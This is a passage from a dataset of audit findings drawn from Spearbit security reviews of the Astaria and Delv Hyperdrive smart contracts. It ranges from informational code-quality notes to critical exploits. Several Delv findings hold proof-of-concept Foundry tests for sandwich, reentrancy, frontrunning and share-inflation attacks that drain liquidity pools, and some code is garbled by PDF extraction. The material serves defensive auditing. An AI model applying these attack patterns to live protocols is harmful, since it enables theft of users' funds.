        "body": "In _validateCommitment(), we check to confirm that either the sender of the message is adequately qualified to be making the decision to take a lien against the collateral (ie they are the holder, the operator, etc). However, the way this is checked is somewhat roundabout and can be substantially simplified. For example, we check require(operator == receiver); in a block that is only triggered if we've already validated that receiver != operator.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment or remove unused function parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Highlighted functions above take arguments which are never used. particular signature, comment that argument name, otherwise remove that argument completely. If the function has to have a Additional instances noted in Context above.  LienToken.sol#L726 : LienStorage storage s input parameter is not used in _getRemainingInterest. It can be removed and this function can be pure.  VaultImplementation.sol#L341 : incoming is not used buyoutLien, was this variable meant to be used?",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Zero address check can never fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The details.borrower != address(0) check will never be false in the current system as AstariaRouter.sol#L352-L354 will revert when ownerOf is address(0).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "UX differs between Router.commitToLiens and VaultImplementation.commitToLien",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router function creates the Collateralized Token while the VaultImplementation requires the collateral owner to ERC721.safeTransferFrom to the CollateralToken contract prior to calling.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what vaults are listed by Astaria",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Anyone can call newPublicVault with epochLength in the correct range to create a public vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Simplify nested if/else blocks in for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are quite a few instances that nested if/else blocks are used in for loops and that is the only block in the for loop. 87 for ( ... ) { if (<CONDITION>) { ... } if else (<CONDITION>) { ... } ... if else (<CONDITION>) { ... } else { revert CustomError(); } }",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the role guardian plays in the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The role of guardian is not documented.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "strategistFee... have not been used can be removed from the codebase.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "strategistFeeNumerator and strategistFeeDenominator are not used except in getStrategist- Fee (which itself also has not been referred to by other contracts). It looks like these have been replaced by the vault fee which gets set by public vault owners when they create the vault.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "redeemFutureEpoch can be called directly from a public vault to avoid using the endpoint from AstariaRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "One can call the redeemFutureEpoch endpoint of the vault directly to avoid the extra gas of juggling assets and multiple contract calls when using the endpoint from AstariaRouter.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "If an imported file is not used, it can be removed.  LienToken.sol#L24 : since Base64 is only imported in this file, if not used it can be removed from the code- base.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reduce nesting by reverting early",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Code following this pattern: if (<CONDITION>) { <BODY> } else { revert(); } can be simplified to remove nesting using custom errors: if (!<CONDITION>) { revert(); } <BODY> or if using require statements, it can be transformed into: require(<CONDITION>) <BODY>",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "assembly can read constant global variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. For instance, highlighted code above have the following pattern: bytes32 slot = WITHDRAW_PROXY_SLOT; assembly { s.slot := slot } Here, WITHDRAW_PROXY_SLOT is a constant which can be used directly in assembly code.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Revert with error messages",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are many instances of require and revert statements being used without an accompanying error message. Error messages are useful for unit tests to ensure that a call reverted due the intended reason, and helps in identifying the root cause.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mixed use of require and revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Astaria codebase uses a mix of require and revert statements. We suggest only following one of these ways to do conditional revert for standardization.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "tokenURI should revert on non-existing tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "As per ERC721 standard, tokenURI() needs to revert if tokenId doesn't exist. The current code returns empty string for all inputs.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inheriting the same contract twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "VaultImplementation inherits from AstariaVaultBase (reference). Hence, there is no need to inherit AstariaVaultBase in Vault and PublicVault contract as they both inherit VaultImplementation already.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "No need to re-cast variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Code above highlights redundant type castings. ERC721 CT = ERC721(address(COLLATERAL_TOKEN())); ... address(msg.sender) These type castings are casting variables to the same type.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comments do not match implementation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " Scenario 1 & 2: Comments note where each parameter ends in a packed byte array, or parameter width in bytes. The comments are outdated.  Scenario 3: The unless is not implemented.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incomplete Natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": " LienToken.sol#L616 s, @return missing  LienToken.sol#L738-L750 s, position, @return missing  CollateralToken.sol#L616-L628 tokenId_ missing 93  VaultImplementation.sol#L153-L165 The second * on /** is missing causing the compiler to ignore the Natspec. The Natspec appears to document an old function interface. Params do not match with the function inputs.  VaultImplementation.sol#L298-L310 missing stack and return vaule  AstariaRouter.sol#L75-L77 @param NatSpec is missing for _WITHDRAW_IMPL, _BEACON_PROXY_IMPL and _- CLEARING_HOUSE_IMPL  AstariaRouter.sol#L44-L47 : Leave a comment that AstariaRouter also acts as an IBeacon for different cloned contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Cannot have multiple liens with same parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Lien Ids are computed by hashing the Lien struct itself. This means that no two liens can have the same parameters (e.g. same amount, rate, duration, etc.).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant unchecked can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are no arithmetic operations in these unchecked blocks. For clarity, it can be removed.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational LienToken.sol#L264,"
        ]
    },
    {
        "title": "Argument name reuse with different meaning across contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ken.LienActionEncumber receiver is the lender (the receiver of the LienToken)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "Licensing conflict on inherited dependencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The version of Solmate contracts depended in tne gpl repository on are AGPL Licensed, making the gpl repository adopt the same license. This license is incompatible with the currently UNLICENSED Astaria related contracts.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Informational"
        ]
    },
    {
        "title": "An attacker can force 0 shares to be minted for a liquidity provider",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "If there are no outstanding long positions an attacker can frontrun a call to addLiquidity(...) and open a max possible short position such that z = 0. Then when the liquidity provider's call will go through the _updateLiquidity(_shareReservesDelta) will be a NOOP since z = 0 and the if block below would want to avoid the division by 0: // below z = shareReserves = 0 uint256 shareReserves = _marketState.shareReserves; if (_shareReservesDelta != 0 && shareReserves > 0) { int256 updatedShareReserves = int256(shareReserves) + _shareReservesDelta; _marketState.shareReserves = uint256( // NOTE: There is a 1 wei discrepancy in some of the // calculations which results in this clamping being required. updatedShareReserves >= 0 ? updatedShareReserves : int256(0) ).toUint128(); _marketState.bondReserves = uint256(_marketState.bondReserves) .mulDivDown(_marketState.shareReserves, shareReserves) .toUint128(); } And therefore the point (z, y ) stays the same and does not get scaled. Thus endingPresentValue == starting- PresentValue and so the lpShares calculated below would be 0: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue ); now when _mint(...) is called with a 0 value as lpShares: // Mint LP shares to the supplier. _mint(AssetId._LP_ASSET_ID, _destination, lpShares); The MultiToken's implementation of _mint(...) will be called: function _mint( uint256 tokenID, address to, uint256 amount ) internal virtual { _balanceOf[tokenID][to] += amount; _totalSupply[tokenID] += amount; // Emit an event to track minting emit TransferSingle(msg.sender, address(0), to, tokenID, amount); } which allows minting when amount == 0.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Drain pool by sandwiching matured shorts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When shorts mature, they are not traded on the \"curve\", they use the \"flat\" part of the flat+curve model and are converted 1-to-1 to a base amount that is then added to the share reserves (and bond reserves are updated to keep the spot price the same). However, this update to the reserves still affects the \"curve\" part of the model as it uses the same reserves. An attacker can profit from this by sandwiching this sudden update of the reserves by opening a short and closing it again after the update:  Attacker waits until a short position matures.  Attacker frontruns the application of the checkpoint by opening the max amount of shorts. This brings the share reserves close to 0. (Opening the max amount leads to max profit but opening fewer shorts is still profitable. This means this is not only an attack abusing the chaotic behavior of the curve at the 0-shares point. However, it heavily amplifies the ROI of the attack).  The shorts mature, increasing the reserves.  Attacker backruns by closing their shorts again for a profit. In the proof of concept, the attacker can perform this attack in a single transaction if the checkpoint was not triggered already. They open the short for 72,584e18 base and close for 741,169e18base at a 1021% return. The losses are suffered by the LPs. The sandwich attack leads to losing 66.16% of the pool share reserves. Proof of Concept  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } function test_sandwich_maturing_shorts() external 6 { uint256 apr = 0.01e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // 0. Alice shorts some bonds. uint256 bondAmount = 100_000e18; (uint256 maturityTime, uint256 baseAmount) = openShort(alice, bondAmount, true); console2.log(\"maturing bonds\", bondAmount / 1e18); // 1. let shorts mature // we move to the checkpoint AFTER maturity so we can do openShort + ,! checkpoint(maturity) + closeShort // in a single transaction, risk-free profit. // It  s also possible to do openShort 1 second before maturity, and the rest at ,! maturity. uint256 checkpointDuration = hyperdrive.getPoolConfig().checkpointDuration; advanceTime(maturityTime - block.timestamp + checkpointDuration, 0.01e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves before openShort %s / %s\", poolInfo.shareReserves / ,! 1e18, poolInfo.bondReserves / 1e18); // 2. attacker Bob opens max shorts, leaving the pool with 0 share reserves // there is another bug where the protocol reverts when applying the checkpoint in    ,! checkpoint -> _updateLiquidity  // the toUint128 reverts for ,! uint256(_marketState.bondReserves).mulDivDown(_marketState.shareReserves, shareReserves)) // therefore, we reduce the max short amount a little bit s.t. the updated bond reserves ,! don t overflow uint128  uint256 bondAmountSandwich = hyperdrive.calculateMaxShort() - 1e11; (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, ,! bondAmountSandwich, true); console2.log(\"sandwich: opened %s bonds with %s base\", bondAmountSandwich / 1e18, ,! baseAmountSandwich / 1e18); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves after openShort %s / %s\", poolInfo.shareReserves / ,! 1e18, poolInfo.bondReserves / 1e18); // 3. attacker triggers the maturing of old shorts, this adds back to the reserves hyperdrive.checkpoint(maturityTime); // 4. attacker now closes their shorts for a profit uint256 baseProceeds = closeShort(bob, maturityTimeSandwich, bondAmountSandwich); console2.log(\"sandwich: baseProceeds: %s, ROI: %s%\", baseProceeds / 1e18, baseProceeds * ,! 1e2 / baseAmountSandwich); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves at end %s / %s\", poolInfo.shareReserves / 1e18, ,! poolInfo.bondReserves / 1e18); } }  Output Here is a model demonstrating how the curve changes after the operations. 7 parameter description (cid:15) P1 P2 P3 P4 P5 dy Tiny amount to avoid z getting close to 0 when solving for the max short move Initial point The point after opening the first short position, moves on the curve C1 The point after opening the second short position, moves on the curve C2 which passes through P2 The point after applying the checkpoint for the maturity time of the first open short position The point after closing the second short position, moves on the C3 which passes through P4 The amount bonds opened in the first open short position",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Reentrancy in StEthHyperdrive.openShort",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The StethHyperdrive._deposit function contains refund logic which performs a .call to the msg.sender. When opening shorts, this _deposit with the callback happens in the middle of state updates which can be abused by an attacker. The _deposit happens after calculating the short reserves updates (_calcula- teOpenShort) but before applying these updates to the reserves. When the attacker receives the callback they can trade on the same curve with the same reserves a second time which allows them to get a better price execution (incurring less slippage) than a single large trade. In the proof of concept, the attacker opens half the short initially and half the short through reentrancy, and then immediately closes the total short amount for a profit, draining the pool funds. Proof of concept Note: The proof of concept was implemented by adjusting the MockHyperdrive to mimic the behavior of StEthHyperdrive's callback.  Changes to MockHyperdrive: 8 function _deposit(uint256 amount, bool) internal override returns (uint256, uint256) { + _callback(); uint256 assets = _baseToken.balanceOf(address(this)); bool success = _baseToken.transferFrom(msg.sender, address(this), amount); if (!success) { revert Errors.TransferFailed(); } if (totalShares == 0) { totalShares = amount; return (amount, FixedPointMath.ONE_18); } else { uint256 newShares = totalShares.mulDivDown(amount, assets); totalShares += newShares; return (newShares, _pricePerShare()); } } + function _callback() internal { + + // I added this to simulate the ETH refund callback in // NOTE: we are doing the callback before transferFrom    StEthHyperdrive . to simulate the share price not  ,! ,! ,! ,! changing as the StEthHyperdrive callback happens before share price unchanged, it in between the share price, which would not simulate StEthHyperdrive (or any atomic deposit). lido.getTotalPooledEther().divDown(lido.getTotalShares()); transferFrom totalShares submit update in the Mock, it will change the ting to lido and leaves its and       . If we do   (bool success,) = payable(msg.sender).call{value: 0}(\"\"); if (!success) { revert Errors.TransferFailed(); } + + + + + }  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; uint256 internal recurseDepth = 0; uint256 internal constant bondAmountToBuy = 1_000_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } 9 function test_open_short_reentrancy() external { uint256 apr = 0.10e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // Short some bonds. uint256 baseBalanceBefore = baseToken.balanceOf(address(this)); // uint256 bondAmount = bondAmountToBuy; uint256 bondAmount = bondAmountToBuy / 2; (uint256 maturityTime, uint256 baseAmount) = openShort(address(this), bondAmount, true); console2.log(\"baseAmount paid for first short\", baseAmount / 1e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); uint256 tokenId = AssetId.encodeAssetId(AssetId.AssetIdPrefix.Short, maturityTime); uint256 totalShorts = hyperdrive.balanceOf(tokenId, address(this)); console2.log(\"total shorts\", totalShorts / 1e18); // // Redeem the bonds. uint256 baseProceeds = closeShort(address(this), maturityTime, totalShorts); console2.log(\"baseProceeds closing shorts\", baseProceeds / 1e18); } receive() payable external { recurseDepth++; if(recurseDepth > 1) return; uint256 bondAmount = bondAmountToBuy / 2; (uint256 maturityTime, uint256 baseAmount) = openShort(address(this), bondAmount, true); console2.log(\"baseAmount paid for 2nd short\", baseAmount / 1e18); } }  Output",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "addLiquidity(...) can be griefed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "An attacker can DoS/block another use to provide liquidity to the Hyperdrive. The attack works as follows: 1. The attacker frontruns a transaction that would call addLiquidity(...) by opening the maximum possible short. In case of no or small outstanding longs ( 0 such that: L0 c (cid:24) 0 ), the attacker can reduce the z to a number close to 1 (cid:0) APR = (cid:1)t norm pos ts (cid:22)z y (cid:22)z y ts blows up to a really big number since the denominator or ts (cid:22)z y would be a really small number such the apr = HyperdriveMath.calculateAPRFromReserves(...) would not be less than or equal to _maxApr provided by the user in the next transaction. The attacker might also be able to trigger division by (cid:22)z y = 0 revert. 2. The user's transaction of calling addLiquidity(...) would be processed and reverted due to above. Even if the user sets _maxApr = type(uint256).max, the attacker can take advantage of the division by 0 case or if that is not possible the following calculation of lpShares would underflow and revert due to the fact that endingPresentValue < startingPresentValue: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue ); This line of attack is similar to the ones used in the below issues where the attacker tries to open a short with the maximum possible amount:  Sandwich a call to addLiquidity(...) for profit  Drain pool by sandwiching matured shorts",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Applying checkpoint can revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The applyCheckpoint function can revert even with conservative pool parameters and reserves. It can revert in _applyCloseShort -> _updateLiquidity when checking that the bond reserves fit into a uint128 value: int256(0)).toUint128(); uint256 shareReserves = _marketState.shareReserves; _marketState.shareReserves = uint256(updatedShareReserves >= 0 ? updatedShareReserves : ,! _marketState.bondReserves = uint256(_marketState.bondReserves) .mulDivDown(_marketState.shareReserves, shareReserves) .toUint128(); The _marketState.shareReserves / shareReserves factor can become large if there were close to 0 shares in the reserves and a large shares update comes in. This can happen, for example, if opening shorts brought the share reserves close to 0 and then matured shorts put back a lot of share reserves afterwards. See the POC for this example. The impact is that one cannot trade on the AMM anymore as all trades first try to apply the current checkpoint. The bonds for this checkpoint can never be closed, permanently locking up LP and trader funds. Proof of Concept:  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; // uint256 internal recurseDepth = 0; // uint256 internal constant bondAmountToBuy = 100_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } function test_checkpoint_revert() external 12 { uint256 apr = 0.01e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // 0. Alice shorts some bonds. uint256 bondAmount = 100_000e18; (uint256 maturityTime, uint256 baseAmount) = openShort(alice, bondAmount, true); console2.log(\"maturing bonds\", bondAmount / 1e18); // 1. let shorts almost mature uint256 checkpointDuration = hyperdrive.getPoolConfig().checkpointDuration; advanceTime(maturityTime - block.timestamp - 1, 0.01e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves before openShort %s / %s\", poolInfo.shareReserves, ,! poolInfo.bondReserves); // 2. attacker Bob opens max shorts, leaving the pool with 0 share reserves uint256 bondAmountSandwich = hyperdrive.calculateMaxShort(); (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, ,! bondAmountSandwich, true); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves after openShort %s / %s\", poolInfo.shareReserves, ,! poolInfo.bondReserves); // 3. attacker triggers the maturing of old shorts, this reverts when safe-casting to ,! uint128 advanceTime(1, 0.00e18); hyperdrive.checkpoint(maturityTime); } }",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "First LP can steal subsequent LP provisions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The AaveHyperdrive and DsrHyperdrive compute the yield share contribution of LPs in _deposit as uint256 newShares = totalShares_.mulDivDown(amount, assets);. Furthermore, the assets can be arti- ficially inflated by donating to the contract. The first depositor can use this to steal subsequent LP provisions by frontrunning them with a donation and making them mint 0 yield shares. The 0 yield shares contribution also trans- lates to 0 minted LP shares as Hyperdrive's present value does not change. The attacker can afterward redeem their own shares for the entirety of the assets, including the assets of the victim LP. Example:  Victim calls AaveHyperdrive.addLiquidity with a contribution of 1e6 * 1e18 DAI. The transaction is pend- ing in the mem pool.  The attacker (the first and sole LP) removes their liquidity (or adds liquidity) such that the totalSupply is 1. For example, assume totalSupply = totalAssets = 1 with a sharePrice = 1e18.  The attacker donates 1e6 * 1e18 DAI to the pool, totalSupply = 1, totalAssets = 1e24 + 1. 13  The victim transaction is mined, _deposit calculates newShares = totalShares_.mulDivDown(amount, assets) = 1 * 1e24 / (1e24 + 1) = 0. totalSupply = 1, totalAssets = 2e24 + 1.  The attacker withdraws and receives the totalAssets = 2e24 + 1 with a profit of the victim's contribution.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "pow function silently overflows and yields wrong results",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "The FixedPointMath.pow function can silently overflow in the intermediate computation of ylnx := mul(y_int256, lnx). The final result will be wrong. function test_pow() public { uint256 x = 2e18; // computes y * ln(x) first with x,y 18-decimal fixed point // chosen s.t. y * ln(x) overflows and is close to 0 uint256 y = type(uint256).max / uint256(FixedPointMath.ln(int256(x))) + 1; // 2.0 ** y should be a huge value but is 1.0 (1e18) as y*ln(x) overflows and then computes exp(0) = 1e18 uint256 res = FixedPointMath.pow(x, y); assertEq(res, 1e18); // this should not be true but is ,! } This function is used by several computations in HyperdriveMath.sol and YieldSpaceMath.sol.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Governance fees are part of share reserves when opening shorts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Governance fees are not supposed to be part of the share reserves. When opening shorts, they are part of the shares reserves. The relevant flow of variables in openShort is as follows: openShort(bondAmount) // _calculateOpenShort shareReservesDelta = HDM.calculateOpenShort(bondAmount) // YSM.calculateSharesOutGivenBondsIn on curve shareReservesDelta -= totalCurveFee traderDeposit = HDM.calculateShortProceeds(bondAmount, shareReservesDelta) // _applyOpenShort marketState.shareReserves -= shareReservesDelta // shareReserves // = shareReserves - shareReservesDelta + totalCurveFee marketState.bondReserves += bondAmount = shareReserves - shareReservesDelta   _mint(bondAmount) 14 As totalCurveFee includes the totalGovernanceFee, it is also part of the updated share reserves. They are currently part of the shares that can be traded and it can lead to the governance fees being traded out and governance will be unable to claim their fees.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Governance fees are part of share reserves when closing non-matured longs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "Governance fees are not supposed to be part of the share reserves. When closing non-matured longs, they are part of the shares reserves. The relevant flow of variables in closeLong is as follows: closeLong(bondAmount@maturity) // _calculateCloseLong (shareReservesDelta, bondReservesDelta, shareProceeds) = ,! shareReservesDelta -= totalCurveFee; shareProceeds -= totalCurveFee + totalFlatFee; HDM.calculateCloseLong(bondAmount@maturity@closeSharePrice) // _applyCloseLong marketState.shareReserves -= shareReservesDelta // = shareReserves - shareReservesDelta + totalCurveFee marketState.bondReserves += bondReservesDelta // = bondReserves + bondReservesDelta _updateLiquidity(-[shareProceeds - shareReservesDelta] = -flatCurvePart)  // = shareReserves - (shareProceeds  // = shareReserves - shareProceeds // = shareReserves - shareProceeds + totalCurveFee + totalFlatFee + shareReservesDelta // = shareReserves - shareProceeds + totalCurveFee + totalFlatFee + shareReservesDelta - totalCurveFee // = shareReserves - shareProceeds + totalFlatFee + shareReservesDelta - shareReservesDelta  + shareReservesDelta   ) // combining both share reserve updates: // shareReserves // = shareReserves - shareProceeds   = shareReserves - shareReservesDelta = shareReserves - shareProceeds + totalCurveFee + totalFlatFee  - (shareProceeds  - shareReservesDelta  ) As totalCurveFee + totalFlatFee includes the totalGovernanceFee, it is also part of the updated share re- serves. It can also be seen by noting that in the entire close-long process, totalGovernanceFee is never read except when adding it to the governance fee storage variable. They are currently part of the shares that can be traded and it can lead to the governance fees being traded out and governance will be unable to claim their fees.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No LP fees when closing matured longs/shorts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "When closing matured longs through closeLong or checkpoint, _applyCheckpoint is first run which closes the matured longs/shorts for this checkpoint. This function, however, does not take a fee on the sharePro- ceeds. The share (and bond) reserves are updated by updateLiquidity(-shareProceeds) which reduces the share proceeds by the fee-exclusive shareProceeds. When traders now close their positions by calling closeLong, their own shareProceeds are reduced by the to- talFlatFee but this fee is never added back to the share reserves, i.e., never reinvested for the LPs. Note that the same issue also applies to closing shorts.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: High Risk"
        ]
    },
    {
        "title": "ERC4626DataProvider does not calculate the price per share correctly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf",
        "body": "ERC4626DataProvider does not calculate the price per share correctly. It returns the inverse of the price per share. This hook is implemented correctly in ERC4626Hyperdrive.",
        "labels": [
            "Spearbit",
            "Delv",
            "Severity: Medium Risk"
        ]
    },
    {
